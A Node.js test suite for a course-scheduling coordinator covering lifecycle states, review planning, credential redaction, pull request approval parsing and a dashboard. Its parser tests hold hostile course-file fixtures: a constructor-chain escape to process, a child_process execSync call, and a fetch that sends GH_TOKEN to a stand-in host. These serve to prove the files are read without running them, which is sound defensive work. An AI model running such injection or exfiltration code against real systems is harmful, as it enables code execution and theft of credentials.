#!/usr/bin/env node
/* Checks of the coordinator: time zone, lifecycle, review planning and change detection,
   reading course files without running them, published-content separation, credential
   redaction, timeouts, approvals, the dashboard, and the records themselves.
   node coordinator/coord_test.js   (no network, no dependencies) */
'use strict';
const fs = require('fs'), path = require('path'), os = require('os'), cp = require('child_process');
const C = require('./coord.js');
let fails = 0, passes = 0;
const check = (ok, label, detail) => { if(ok){ passes++; console.log('  ok    ' + label); } else { fails++; console.log('  FAIL  ' + label + (detail !== undefined ? '  — ' + C.redact(JSON.stringify(detail)) : '')); } };
const T = s => Date.parse(s);
const read = f => JSON.parse(fs.readFileSync(path.join(__dirname, f), 'utf8'));
const cfg = read('courses.json');
const clone = x => JSON.parse(JSON.stringify(x));
const deent = cfg.courses.find(c => c.id === 'deent');
const TMP = fs.mkdtempSync(path.join(os.tmpdir(), 'coord-test-'));
// fake credentials, built at run time so this file holds none
const FAKE = {ghp: 'ghp_' + 'A1'.repeat(18), gho: 'gho_' + 'B2'.repeat(18), ghs: 'ghs_' + 'C3'.repeat(18), ghu: 'ghu_' + 'D4'.repeat(18),
  pat: 'github_pat_' + 'E5'.repeat(20), xat: 'https://x-access-token:' + 'F6'.repeat(12) + '@github.com/o/r', bearer: 'Authorization: Bearer ' + 'G7'.repeat(15), basic: 'https://user:' + 'H8'.repeat(8) + '@github.com/o/r',
  query: 'https://h/x?access_token=' + 'J9'.repeat(10), anth: 'sk-ant-' + 'K0'.repeat(12)};

console.log('\n=== Time in America/Chicago ===');
check(C.zonedInstant('2026-11-09', '09:00', 'America/Chicago') === T('2026-11-09T15:00:00Z'), '9:00 on 11/09 (CST) is 15:00 UTC');
check(C.zonedInstant('2026-10-27', '08:00', 'America/Chicago') === T('2026-10-27T13:00:00Z'), '8:00 on 10/27 (CDT) is 13:00 UTC');
check(C.zonedInstant('2026-11-01', '00:00', 'America/Chicago') === T('2026-11-01T05:00:00Z'), 'midnight on the day daylight saving ends is 05:00 UTC');
const day = C.examSpan({name: 'X', date: '2026-11-16'}, 'America/Chicago');
check(day.span.start === T('2026-11-16T06:00:00Z') && day.span.end === T('2026-11-17T06:00:00Z') && !day.span.timeKnown && /time not recorded/.test(day.notes[0]), 'an exam with no time covers its whole local day, and says so');
const win = C.examSpan({name: 'Q', date: '2026-11-17', endDate: '2026-11-19'}, 'America/Chicago');
check(win.span.end === T('2026-11-20T06:00:00Z'), 'a quiz window ends at the end of its last day');
const winT = C.examSpan({name: 'Q', date: '2026-11-17', endDate: '2026-11-19', start: '08:00', minutes: 60}, 'America/Chicago');
check(winT.span.end === T('2026-11-20T06:00:00Z'), 'a window with a start time still ends with its last day');
const noLen = C.examSpan({name: 'E', date: '2026-11-16', start: '09:00'}, 'America/Chicago');
check(noLen.span.end === T('2026-11-17T06:00:00Z') && noLen.notes.some(n => /length not recorded/.test(n)), 'a start time with no length: counted to the end of the day and flagged, not given an invented length', noLen);
const bad = C.examSpan({name: 'E', date: '2026-02-30'}, 'America/Chicago');
check(bad.span === null && /not a real calendar date/.test(bad.notes[0]), '2026-02-30 is refused as a date, not rolled over to March');

console.log('\n=== Lifecycle: DEENT through its term ===');
const at = (s, c = deent) => C.lifecycle(c, T(s), cfg);
check(at('2026-11-01T17:00:00Z').status === 'active', '11/01: active (Exam 1 more than 7 days away)');
check(at('2026-11-02T15:00:00Z').status === 'exam-approaching' && at('2026-11-02T14:59:00Z').status === 'active', 'exam-approaching starts exactly 7 days before Exam 1 starts');
check(at('2026-11-06T15:00:00Z').status === 'exam-approaching', '11/06: exam-approaching (Exam 1 on 11/09)');
check(/in progress/.test(at('2026-11-09T16:00:00Z').why), 'during Exam 1: in progress');
check(at('2026-11-09T18:00:00Z').next.id === 'exam2', 'after Exam 1 ends, the next exam is Exam 2');
check(at('2026-11-28T18:00:00Z').status === 'active', '11/28: active (the final more than 7 days away)');
check(at('2026-12-01T18:00:00Z').status === 'exam-approaching' && at('2026-12-01T18:00:00Z').next.id === 'final', '12/01: exam-approaching, the final next');
check(at('2026-12-07T15:30:00Z').status === 'exam-approaching' && /in progress/.test(at('2026-12-07T15:30:00Z').why), 'during the final (9:00-10:30 Central): exam-approaching, in progress');
check(at('2026-12-07T17:00:00Z').status === 'recently-completed', 'once the final has ended (10:30 Central): recently-completed');
check(at('2026-12-08T18:00:00Z').status === 'recently-completed', '12/08: recently-completed');
check(at('2026-12-28T16:29:00Z').status === 'recently-completed' && at('2026-12-28T16:31:00Z').status === 'completed', 'recently-completed lasts exactly 21 days after the final ends (10:30 Central on 12/07)');
check(at('2027-12-31T18:00:00Z').status === 'archived', 'a year after the final: archived');
check(at('2026-11-06T15:00:00Z').flags.some(f => /tentative/.test(f)) && !at('2026-11-06T15:00:00Z').flags.some(f => /time not recorded/.test(f)), 'DEENT: the syllabus times are recorded; the dates are flagged as tentative');
const bdk = cfg.courses.find(c => c.id === 'bdk');
check(C.lifecycle(bdk, T('2026-11-06T15:00:00Z'), cfg).flags.some(f => /Week 14 quiz.*time not recorded/.test(f)), 'a missing exam time is flagged, not invented (BDK quizzes)');
const dx = clone(deent); dx.activeExam = 'exam1';
check(C.lifecycle(dx, T('2026-11-25T18:00:00Z'), cfg).status === 'active', 'completion does not follow activeExam: on 11/25 the course is active (the Final ahead)');

console.log('\n=== Lifecycle: a final with no date (review must-fix 4) ===');
const nf = clone(deent); nf.schedule.exams.find(e => e.id === 'final').date = null;
let lc = null, threw = null;
try { lc = C.lifecycle(nf, T('2026-11-30T18:00:00Z'), cfg); } catch(e){ threw = e.message; }
check(!threw && lc.status === 'active', 'every dated exam passed and the final undated: no crash, active', threw || lc);
check(lc && lc.flags.some(f => /\(the final\) has no date/.test(f)) && lc.final && lc.final.date === null, 'the missing final date is flagged and no date is invented', lc);
check(!threw && C.lifecycle(nf, T('2026-11-20T18:00:00Z'), cfg).next.id === 'exam3', 'before the last dated exam, the next exam is still found');
{
  const saved = fs.readFileSync(path.join(__dirname, 'courses.json'), 'utf8');
  const nfCfg = clone(cfg); nfCfg.courses = [nf];
  let ok = true; try { C.plan(nfCfg, {checkpoints: {}}, null, T('2026-11-30T18:00:00Z'), {items: []}); } catch(e){ ok = false; }
  check(ok, 'planning a course whose final has no date does not crash');
  check(fs.readFileSync(path.join(__dirname, 'courses.json'), 'utf8') === saved, 'no record was changed');
}
const late = clone(deent); late.schedule.exams.push({id: 'makeup', name: 'Makeup exam', date: '2026-12-14', start: null, siteId: null, status: 'planned', source: 'test'});
check(C.lifecycle(late, T('2026-12-10T18:00:00Z'), cfg).flags.some(f => /Makeup exam is dated after Final Exam/.test(f)), 'an exam dated after the marked final is flagged');

console.log('\n=== Lifecycle: overrides, reactivation, missing data ===');
const ov = clone(deent); ov.override = {status: 'active', until: '2027-01-31', reason: 'course extended'};
check(C.lifecycle(ov, T('2027-01-31T05:59:00Z'), cfg).status === 'active' && C.lifecycle(ov, T('2027-01-31T06:01:00Z'), cfg).status === 'completed', 'a date-only override "until" ends at midnight America/Chicago');
const ovBad = clone(deent); ovBad.override = {status: 'active', until: 'Jan 31 next year', reason: 'x'};
const ovb = C.lifecycle(ovBad, T('2026-12-31T18:00:00Z'), cfg);
check(ovb.status === 'completed' && ovb.flags.some(f => /not a date: the override is not applied/.test(f)), 'an override "until" that is not a date is flagged and not applied silently', ovb);
const re = clone(deent); re.schedule.exams.push({id: 'spring1', name: 'Spring Exam 1', date: '2027-02-10', start: '09:00', minutes: 90, siteId: null, status: 'planned', source: 'test'});
re.schedule.exams.find(e => e.id === 'final').final = false; re.schedule.exams[re.schedule.exams.length - 1].final = true;
check(C.lifecycle(re, T('2027-01-15T18:00:00Z'), cfg).status === 'active', 'a completed course with a new term\'s exam becomes active again');
const badO = clone(deent); badO.override = {status: 'finished'};
threw = false; try { C.lifecycle(badO, T('2026-11-06T15:00:00Z'), cfg); } catch(e){ threw = true; }
check(threw, 'an override with an unknown status is refused');
const nodate = {id: 'x', schedule: {exams: [{id: 'e1', name: 'Exam 1', date: null, status: 'planned'}]}};
const nd = C.lifecycle(nodate, T('2026-11-06T15:00:00Z'), cfg);
check(nd.status === 'active' && nd.flags.some(f => /no date recorded/.test(f)) && nd.flags.some(f => /no exam is marked as the final/.test(f)), 'no dated exam: active, with the missing date and final flagged', nd);
const before = JSON.stringify(deent);
for(const d of ['2026-11-01', '2026-11-17', '2026-12-31']) C.lifecycle(deent, T(d + 'T18:00:00Z'), cfg);
check(JSON.stringify(deent) === before, 'working out the lifecycle changes no record (a date passing never changes a release status)');

console.log('\n=== Review planning and change detection ===');
const mk = (status, extra) => Object.assign({id: 'c', repo: 'o/c', schedule: {exams: []}, override: {status, reason: 'test'}}, extra || {});
const P = (courses, checkpoints, heads, now, items) => C.plan(Object.assign({}, cfg, {courses}), {checkpoints}, heads, T(now), {items: items || []});
const N = '2026-11-20T12:00:00Z';
let r = P([mk('completed')], {c: {lastReviewedCommit: 'aaa', lastReviewAt: '2026-11-01T12:00:00Z', lastDeepAt: '2026-11-01T12:00:00Z'}}, {'o/c': 'aaa'}, N)[0];
check(r.action === 'wait', 'completed, reviewed 19 days ago: waits (monthly)', r);
r = P([mk('completed')], {c: {lastReviewedCommit: 'aaa', lastReviewAt: '2026-10-01T12:00:00Z', lastDeepAt: '2026-10-01T12:00:00Z'}}, {'o/c': 'aaa'}, N)[0];
check(r.action === 'skip', 'completed, due, unchanged: skipped (no review of unchanged code)', r);
r = P([mk('completed')], {c: {lastReviewedCommit: 'aaa', lastReviewAt: '2026-10-01T12:00:00Z', lastDeepAt: '2026-10-01T12:00:00Z'}}, {'o/c': 'bbb'}, N)[0];
check(r.action === 'review' && /changed since aaa/.test(r.reason), 'completed, due, changed: reviewed', r);
r = P([mk('completed')], {c: {lastReviewedCommit: 'aaa', lastReviewAt: '2026-11-01T12:00:00Z', lastDeepAt: '2026-07-01T12:00:00Z'}}, {'o/c': 'aaa'}, N)[0];
check(r.action === 'deep-audit', 'completed, last deep review over 91 days ago: deep audit', r);
r = P([mk('active')], {c: {lastReviewedCommit: 'aaa', lastReviewAt: '2026-11-19T12:00:00Z'}}, {'o/c': 'aaa'}, N)[0];
check(r.action === 'light', 'active, due daily, unchanged: a light pass only', r);
r = P([mk('active')], {c: {lastReviewedCommit: 'aaa', lastReviewAt: '2026-11-20T06:00:00Z'}}, {'o/c': 'bbb'}, N)[0];
check(r.action === 'wait', 'active, reviewed 6 hours ago: waits for the next day', r);
r = P([mk('recently-completed')], {c: {lastReviewedCommit: 'aaa', lastReviewAt: '2026-11-17T12:00:00Z'}}, {'o/c': 'bbb'}, N)[0];
check(r.action === 'wait', 'recently completed, reviewed 3 days ago: waits (weekly)', r);
r = P([mk('recently-completed')], {c: {}}, {'o/c': 'bbb'}, N)[0];
check(r.action === 'retrospective', 'recently completed, never reviewed: retrospective', r);
r = P([mk('archived')], {c: {lastReviewedCommit: 'aaa'}}, {'o/c': 'aaa'}, N)[0];
check(r.action === 'skip', 'archived, unchanged: skipped', r);
r = P([mk('archived')], {c: {lastReviewedCommit: 'aaa'}}, {'o/c': 'bbb'}, N)[0];
check(r.action === 'essential-check', 'archived, changed: an essential check only', r);
const crit = [{id: 'save-loss', severity: 'critical', candidateCourses: ['c'], status: 'evaluating'}];
r = P([mk('completed')], {c: {lastReviewedCommit: 'aaa', lastReviewAt: '2026-11-10T12:00:00Z', lastDeepAt: '2026-11-10T12:00:00Z'}}, {'o/c': 'aaa'}, N, crit)[0];
check(r.action === 'review' && /save-loss/.test(r.reason), 'a critical open item is reviewed whatever the lifecycle and cadence', r);
r = P([mk('completed')], {c: {lastReviewedCommit: 'aaa', lastReviewAt: '2026-11-20T08:00:00Z', lastDeepAt: '2026-11-20T08:00:00Z'}}, {'o/c': 'aaa'}, N, crit)[0];
check(r.action === 'light' && /unchanged since today's review/.test(r.reason), 'a critical item with an unchanged head reviewed today: a light pass, not a full review again', r);
r = P([mk('completed')], {c: {lastReviewedCommit: 'aaa', lastReviewAt: '2026-11-19T12:00:00Z', lastDeepAt: '2026-11-19T12:00:00Z'}}, {'o/c': 'aaa'}, N,
  [{id: 'old', severity: 'critical', candidateCourses: ['c'], status: 'adopted'}])[0];
check(r.action === 'wait', 'a critical item already adopted does not force a review', r);
const order = P([mk('completed', {id: 'a'}), mk('exam-approaching', {id: 'b'}), mk('active', {id: 'd'}), mk('completed', {id: 'c'})], {}, {}, N, crit).map(x => x.course);
check(order.join() === 'c,b,d,a', 'a course with a critical item comes first, then exam-approaching, active, completed', order);
r = P([mk('active')], {c: {lastReviewedCommit: 'aaa', lastReviewAt: '2026-11-10T12:00:00Z'}}, null, N)[0];
check(r.action === 'review' && r.head === null, 'with no head known (offline), a due review is not skipped as unchanged', r);

console.log('\n=== Course files are read, never run (review must-fixes 1 and 2) ===');
const site = txt => C.parseCourse(txt);
const marker = path.join(TMP, 'pwned');
const attacks = [
  ['the constructor chain to process', "const COURSE = {exams:[{id:'exam1'}], activeExam:'exam1', p: this.constructor.constructor('return process')().mainModule.require('fs').writeFileSync(" + JSON.stringify(marker) + ", 'x')};"],
  ['require', "require('child_process').execSync('touch " + marker + "'); const COURSE = {exams:[{id:'exam1'}], activeExam:'exam1'};"],
  ['the environment', "const COURSE = {exams:[{id:'exam1'}], activeExam:'exam1', e: process.env.GH_TOKEN};"],
  ['the network', "fetch('https://example.invalid/'+process.env.GH_TOKEN); const COURSE = {exams:[{id:'exam1'}], activeExam:'exam1'};"]
];
for(const [label, src] of attacks){
  let res = null, err = null;
  try { res = site(src); } catch(e){ err = e.message; }
  check(!err && !fs.existsSync(marker) && res.exams.length === 1 && res.exams[0].id === 'exam1', `a course file that tries ${label}: its data is read and nothing in it runs`, err || res);
}
// the same files, checked in a separate process, which records whether any of it ran
{
  const probe = cp.spawnSync(process.execPath, ['-e', `globalThis.process.__ran=false; const C=require(${JSON.stringify(path.join(__dirname, 'coord.js'))}); for(const s of ${JSON.stringify(attacks.map(a => a[1]))}) C.parseCourse(s); require('fs').writeFileSync(${JSON.stringify(path.join(TMP, 'probe'))}, 'done');`], {encoding: 'utf8', timeout: 5000, killSignal: 'SIGKILL', env: {PATH: process.env.PATH, GH_TOKEN: 'decoy'}});
  check(probe.status === 0 && fs.existsSync(path.join(TMP, 'probe')) && !fs.existsSync(marker), 'in a separate process with a decoy token in its environment, none of the course code ran');
}
const loops = [
  ['an endless microtask chain', "Promise.resolve().then(function f(){return Promise.resolve().then(f)}); const COURSE = {exams:[{id:'exam1'}], activeExam:'exam1'};"],
  ['a getter that never returns', "const COURSE = {get exams(){while(true){}}, activeExam:'exam1'};"],
  ['a plain endless loop', "while(true){} const COURSE = {exams:[{id:'exam1'}], activeExam:'exam1'};"]
];
for(const [label, src] of loops){
  // in a child process with a hard limit, so a hang would show here as a timeout
  const t0 = Date.now();
  const res = cp.spawnSync(process.execPath, ['-e', `const C=require(${JSON.stringify(path.join(__dirname, 'coord.js'))}); const r=C.parseCourse(${JSON.stringify(src)}); const p=C.checkPublished(${JSON.stringify(deent)}, r); console.log(JSON.stringify({ids:r.exams.map(e=>e.id), w:r.warnings, ok:p.ok}));`], {encoding: 'utf8', timeout: 5000, killSignal: 'SIGKILL'});
  const ms = Date.now() - t0;
  check(res.status === 0 && ms < 3000, `${label}: reading and checking finish in ${ms} ms, with no code run`, {status: res.status, signal: res.signal, out: (res.stdout || '').slice(0, 200)});
}
const getterRes = site("const COURSE = {get exams(){while(true){}}, activeExam:'exam1'};");
check(getterRes.warnings.some(w => /no exams property/.test(w)), 'an exams getter is reported as not readable, not run', getterRes);
const nonLit = site("const X='exam9'; const COURSE = {exams:[{id:X},{id:'exam1'}], activeExam: pick(), kit:{core:'abc1234'}};");
check(nonLit.exams.length === 1 && nonLit.warnings.some(w => /exam's id is not a literal/.test(w)) && nonLit.warnings.some(w => /activeExam is not a literal/.test(w)) && nonLit.activeExam === null && nonLit.kit.core === 'abc1234', 'values that are not literals are reported, not guessed', nonLit);
const tricky = site("/* exams:[{id:'fake'}] */ const COURSE = {name:'a // b', re: /[}\\]]/g, exams:[{id:'exam1', pools:[{filter:{exam:1}}], note:`x}`}, {id:2}], activeExam:2, // activeExam:'z'\n kit:{core:'25c643d'}};");
check(JSON.stringify(tricky.exams) === '[{"id":"exam1"},{"id":2}]' && tricky.activeExam === 2 && tricky.kit.core === '25c643d' && tricky.incomplete.length === 1 && /regular expression/.test(tricky.incomplete[0]), 'comments, strings with brackets and nested objects do not confuse the reader; a regular expression literal makes the file not checked', tricky);
const plainTricky = site("/* exams:[{id:'fake'}] */ const COURSE = {name:'a // b', exams:[{id:'exam1', pools:[{filter:{exam:1}}], note:`x}`}, {id:2}], activeExam:2, // activeExam:'z'\n kit:{core:'25c643d'}};");
check(JSON.stringify(plainTricky.exams) === '[{"id":"exam1"},{"id":2}]' && plainTricky.activeExam === 2 && !plainTricky.incomplete.length, 'the same file without the regular expression reads completely', plainTricky);
let none = null; try { site('const X = {exams: []};'); } catch(e){ none = e.message; }
check(/no object literal assigned to COURSE/.test(none || ''), 'a file with no COURSE object is reported as unreadable');
{
  // a child process past its time limit is killed, and none is left running
  const tag = 'coordtimeout' + process.pid + Date.now();
  const t0 = Date.now();
  const rr = C.run(process.execPath, ['-e', `/*${tag}*/ setInterval(()=>{}, 1000)`], 800);
  const ms = Date.now() - t0;
  const ps = cp.spawnSync('ps', ['-eo', 'args'], {encoding: 'utf8'}).stdout || '';
  check(!rr.ok && rr.timedOut && ms < 5000, `a command past its time limit is stopped (${ms} ms)`, rr);
  check(!ps.includes(tag), 'and no process of it is left running');
}

console.log('\n=== Published content: students see only released exams ===');
const deentSite = site("const COURSE = {name:'DEENT', exams:[{id:'exam1', name:'Exam 1', questions:50}], activeExam:'exam1', kit:{core:'25c643d'}};");
let pr = C.checkPublished(deent, deentSite);
check(pr.ok && pr.knownNotReleased.length === 3 && pr.knownNotReleased.every(s => /planned/.test(s)), 'DEENT: the site lists only Exam 1; Exams 2, 3 and the Final are known but not released', pr);
pr = C.checkPublished(deent, site("const COURSE = {exams:[{id:'exam1'},{id:'exam2', questions:null}], activeExam:'exam1'};"));
check(!pr.ok && pr.problems.some(p => /"exam2"/.test(p)), 'an exam on the site that the schedule does not map is a problem', pr.problems);
const d2 = clone(deent); d2.schedule.exams[1].siteId = 'exam2';
pr = C.checkPublished(d2, site("const COURSE = {exams:[{id:'exam1'},{id:'exam2', questions:null}], activeExam:'exam1'};"));
check(!pr.ok && pr.problems.some(p => /Exam 2.*"planned", not published/.test(p)), 'an empty future exam put on the site before release is a problem', pr.problems);
pr = C.checkPublished(d2, site("const COURSE = {exams:[{id:'exam1'},{id:'exam2'}], activeExam:'exam2'};"));
check(!pr.ok && pr.problems.some(p => /opens on exam "exam2"/.test(p)), 'the site opening on an unreleased exam is a problem', pr.problems);
const d3 = clone(d2); d3.schedule.exams[1].status = 'published';
pr = C.checkPublished(d3, site("const COURSE = {exams:[{id:'exam1'},{id:'exam2'}], activeExam:'exam2'};"));
check(pr.ok, 'once released, Exam 2 may appear and the site may open on it; Exam 1 stays listed (cumulative material)', pr);
pr = C.checkPublished(d3, deentSite);
check(pr.ok && pr.notes.some(n => /Exam 2 is recorded as published but the site does not list it/.test(n)), 'a release recorded but not on the site is reported for correction', pr.notes);
const d4 = clone(deent); d4.schedule.exams[1].status = 'almost';
check(!C.checkPublished(d4, deentSite).ok, 'an unknown release status is a problem');
const ip = cfg.courses.find(c => c.id === 'intro-pharmacology');
pr = C.checkPublished(ip, site("const COURSE = {exams:[{id:1},{id:2},{id:3},{id:4}], activeExam:4};"));
check(pr.ok, 'numeric exam ids on the site match the schedule\'s siteId', pr);
const realDeent = process.env.DEENT_COURSE_JS || '/home/user/deent/src/course.js';
if(fs.existsSync(realDeent)){ pr = C.checkPublished(deent, site(fs.readFileSync(realDeent, 'utf8'))); check(pr.ok, 'the real DEENT course.js, read without running it: only released exams on the site', pr); }

console.log('\n=== Credentials are never shown or kept (review must-fix 5) ===');
for(const [k, v] of Object.entries(FAKE)){
  const out = C.redact(`error: request to ${v} failed`);
  check(C.hasSecret(v) && !C.hasSecret(out), `a ${k} credential is redacted`, out);
}
for(const v of ['GITHUB_TOKEN=abcdefabcdefabcdef', 'GH_ENTERPRISE_TOKEN=x9y8z7w6', 'password=hunter2hunter2', 'Password: correcthorse', 'API_KEY=Zm9vYmFy', 'gh' + 'p_shortABC123']){
  const out = C.redact(`failed: ${v} rejected`);
  check(C.hasSecret(v) && !C.hasSecret(out) && /\[redacted\]/.test(out), `redacted: ${v.replace(/=.*/, '=…').replace(/: .*/, ': …').replace(/_short.*/, '_…')}`, out);
}
check(C.redact('the records hold no tokens: scores and grades are absent') === 'the records hold no tokens: scores and grades are absent', 'ordinary text that mentions tokens is not redacted');
check(C.sanitize('a\n  b ' + FAKE.gho).length <= 240 && !C.hasSecret(C.sanitize('a ' + FAKE.gho)), 'sanitized errors are redacted, on one line and short');
{
  const cache = path.join(TMP, 'cache.json');
  const io = {liveHead: () => ({state: 'unavailable', why: 'fatal: could not read from ' + FAKE.xat + ': ' + FAKE.bearer}),
    liveFile: () => ({state: 'unavailable', why: 'gh: ' + FAKE.gho + ' rejected'}), livePRs: repo => ({state: 'ok', prs: [{number: 1, title: 'leak ' + FAKE.ghs, draft: false, head: 'abcdef1', body: 'Approval: awaiting Louis\n' + FAKE.pat, url: 'u'}]}),
    liveChecks: () => { throw new Error('boom ' + FAKE.ghu); }, liveAhead: () => ({state: 'unavailable', why: FAKE.basic}), liveDeployed: () => ({state: 'unavailable', why: FAKE.query}), kitBehind: () => null};
  let d = null, err = null;
  try { d = C.dashboard(T('2026-11-06T12:00:00Z'), {cache, io}); } catch(e){ err = e.message; }
  check(!err, 'a read that throws does not stop the dashboard', err);
  const mdOut = d ? C.md(d) : '', jsonOut = d ? JSON.stringify(d) : '', cached = fs.existsSync(cache) ? fs.readFileSync(cache, 'utf8') : '';
  check(d && !C.hasSecret(mdOut), 'the dashboard text holds no credential, though every failing read carried one');
  check(d && !C.hasSecret(jsonOut), 'the dashboard data (--json, lastseen) hold no credential');
  check(cached !== '' && !C.hasSecret(cached), 'the cache of last reads holds no credential');
  check(d && /Checks not read/.test(mdOut), 'check runs that could not be read are reported as not read, not as "no failures"');
}

console.log('\n=== Approvals come from an explicit line in the pull request (review must-fix 6) ===');
const H = '1234567890abcdef1234567890abcdef12345678';
const A = (body, head = H) => C.approvalStatus(body, head);
check(A('Summary\n\nApproval: awaiting Louis\n').status === 'awaiting approval', '"Approval: awaiting Louis": awaiting approval');
check(A('**Approval: awaiting Louis (progress storage)**').status === 'awaiting approval', 'bold markup around the line is allowed');
check(A('Approval: approved by Louis on 2026-11-05 at 1234567').status === 'approved', 'approved at the current head: approved');
const old = A('Approval: approved by Louis on 2026-11-05 at fa9f1f6');
check(old.status === 'unclear' && /head is now 1234567, not fa9f1f6/.test(old.source), 'approved at an older head: unclear, with both commits named', old);
check(A('Approval: not needed (test-only, standing policy)').status === 'not needed', '"not needed" is its own status');
check(A('Approval: maybe').status === 'unclear', 'an unrecognised status line is unclear');
const leg1 = A('A document only. It needs your yes before it merges, and merging it changes no code.');
check(leg1.status === 'unclear' && /needs your yes/.test(leg1.source), 'older wording "needs your yes" (kit #23, #30) is shown as unclear with the sentence quoted', leg1);
check(A('**For Louis’s yes or no (progress storage), at cf1cc94.**').status === 'unclear', 'the curly apostrophe is read');
check(A('x'.repeat(9000) + '\nApproval: awaiting Louis').status === 'awaiting approval', 'a line deep in a long description is read (nothing is cut at 4,000 characters)');
check(A('Unlike feature PRs, this test-only fix merges itself under the standing policy.').status === 'none stated', 'a description that asks for nothing is not counted as waiting');
const ap = C.approvalsFrom('o/r', [{number: 1, title: 't', draft: false, head: H, body: 'no line', url: 'u'}], () => [{name: 'Kit checks', status: 'completed', conclusion: 'success'}]);
check(ap[0].approval === 'none stated', 'passing checks never make a pull request approved');
check(C.approvalsFrom('o/r', [{number: 2, title: 't', draft: true, head: H, body: 'Approval: awaiting Louis', url: 'u'}], () => [{name: 'Kit checks', status: 'completed', conclusion: 'success', id: 20, attempt: 2}])[0].failedChecks.length === 0, 'a passing newest run leaves no failed check');

console.log('\n=== The dashboard: live revision, access, last results ===');
{
  const cache = path.join(TMP, 'last.json');
  const deentJs = "const COURSE = {exams:[{id:'exam1'}], activeExam:'exam1', kit:{core:'25c643d'}};";
  let denied = false, noDeploy = false;
  const refs = [];
  let clock = T('2026-11-06T10:00:00Z');
  const io = {
    liveHead: repo => denied && /DEENT/.test(repo) ? {state: 'unavailable', why: 'fake refusal'} : {state: 'ok', head: 'h-' + repo},
    liveDeployed: repo => denied && /DEENT/.test(repo) ? {state: 'unavailable', why: 'x'} : noDeploy && /DEENT/.test(repo) ? {state: 'ok', value: null} : {state: 'ok', value: {sha: 'b2c2523aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa', branch: 'main', at: '2026-11-05T06:16:54Z', run: 9, newer: null}},
    liveFile: (repo, file, ref) => {
      refs.push(`${repo}|${file}|${ref}`);
      if(denied && /DEENT|Intro-Pharmacology/.test(repo)) return {state: 'unavailable', why: 'GitHub access to this repository is not enabled for this session'};
      if(/DEENT/.test(repo) && file === 'src/course.js') return {state: 'ok', text: deentJs};
      if(/DEENT/.test(repo) && /version.json$/.test(file)) return {state: 'ok', text: '{"built": "2026-11-05T06:12:02Z"}'};
      if(/Medicinal/.test(repo) && file === 'src/course.js') return {state: 'ok', text: "const COURSE = {exams:[{id:'final'}], activeExam:'final', kit:{core:'abc1234'}};"};
      if(/Medicinal/.test(repo) && file === 'preview/version.json') return {state: 'ok', text: '{"built": "2026-11-06T01:00:00Z"}'};
      if(/Medicinal/.test(repo) && file === 'version.json') return {state: 'ok', text: '{"built": "2026-11-05T13:06:13Z"}'};
      return {state: 'missing'};
    },
    livePRs: repo => (denied && /DEENT/.test(repo)) || /Intro-Pharmacology/.test(repo) ? {state: 'unavailable', why: 'GitHub access to this repository is not enabled for this session'}
      : {state: 'ok', prs: /DEENT/.test(repo) ? [{number: 7, title: 'Exam 1 release', draft: false, head: 'x', body: 'Approval: awaiting Louis', url: 'u'}] : []},
    liveChecks: () => [], kitBehind: () => 3,
    liveAhead: repo => /DEENT/.test(repo) ? (denied ? {state: 'unavailable', why: 'x'} : {state: 'ok', value: {defaultBranch: 'work', ahead: 4}}) : {state: 'ok', value: {defaultBranch: 'main', ahead: 0}}
  };
  const d1 = C.dashboard(T('2026-11-06T10:00:00Z'), {cache, io, clock: () => clock});
  const m1 = C.md(d1);
  check(refs.includes('lglouis3-create/DEENT|src/course.js|b2c2523aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'), 'the course file is read at the deployed commit, not at a branch head');
  check(/PHAR 4346.*\| b2c2523 on main, deployed 2026-11-05T06:16:54Z \|/.test(m1) && /read at the deployed commit b2c2523/.test(m1), 'the live revision and the basis of the release check are shown');
  check(m1.includes('[lglouis3-create/DEENT#7](u) Exam 1 release — head x; description: "Approval: awaiting Louis"'), 'an awaiting pull request is listed with its head and the line it came from');
  check(/PHAR 4346.*\| no; working branch `work` 4 commits ahead of the live branch \|/.test(m1), 'the same build time at the live revision is no waiting preview; unreleased commits on the working branch are named');
  check(/PHAR 4342.*\| yes \|/.test(m1), 'a preview built after the live page is a waiting preview');
  noDeploy = true;
  const m0 = C.md(C.dashboard(T('2026-11-06T10:30:00Z'), {cache: null, io}));
  check(/PHAR 4346.*\| unknown: no successful Pages deployment found \|/.test(m0) && /the head of main; no successful Pages deployment found, so the live revision is unknown/.test(m0), 'with no successful deployment found, the live revision is reported unknown, not assumed to be the branch head');
  noDeploy = false; denied = true; clock = T('2026-11-06T12:00:00Z');
  const d2 = C.dashboard(T('2030-01-01T00:00:00Z'), {cache, io, clock: () => clock});
  const m2 = C.md(d2);
  check(d2.access.some(a => /DEENT: open pull requests/.test(a.what) && /not enabled for this session/.test(a.why)), 'the failing read and its error (credentials removed) are reported');
  check(m2.includes(`${C.UNAVAILABLE}** for these repositories' pull requests`) && /lglouis3-create\/DEENT: last successful read 2026-11-06T10:00:00.000Z: 1 awaiting approval/.test(m2), 'without access: "Access unavailable—status not checked", with the last successful result and its time');
  check(/PHAR 4346.*Access unavailable—status not checked \(repository head\) \(last successful read 2026-11-06T10:00:00.000Z\)/.test(m2), 'the DEENT row says its head was not checked, with the last read time');
  check(!/\b(is|are|site|repository) down\b|offline site/i.test(m2.split('## Automation activity')[0]), 'nothing says the repository or the site is down');
  check(/Intro-Pharmacology-: no earlier successful read/.test(m2), 'a repository never read before says so, not "none waiting"');
  const cached = JSON.parse(fs.readFileSync(cache, 'utf8'));
  check(Object.values(cached).every(e => !/^2030/.test(e.at)), 'last-read times are the real time of the read, not --now');
  const st = C.lastSeenStore(null, {lastSeen: {'prs|o/r': {at: '2026-11-07T00:00:00Z', value: []}}});
  check(st.get('prs|o/r').at === '2026-11-07T00:00:00Z', 'a last result committed in state.json is used when the cache has none');
  fs.writeFileSync(path.join(TMP, 'old.json'), JSON.stringify({'k': {at: '2026-11-01T00:00:00Z', value: 'old'}}));
  const mix = C.lastSeenStore(path.join(TMP, 'old.json'), {lastSeen: {'k': {at: '2026-11-05T00:00:00Z', value: 'new'}}});
  check(mix.get('k').value === 'new' && mix.all().k.value === 'new', 'the newer result wins in get() and in all() (what lastseen writes)');
  fs.writeFileSync(path.join(TMP, 'null.json'), 'null');
  let ok = true; try { C.lastSeenStore(path.join(TMP, 'null.json'), {}).get('k'); C.dashboard(T('2026-11-06T10:00:00Z'), {cache: path.join(TMP, 'null.json'), io}); } catch(e){ ok = false; }
  check(ok, 'a cache file holding null or garbage does not stop the dashboard');
}

console.log('\n=== The dashboard (offline) ===');
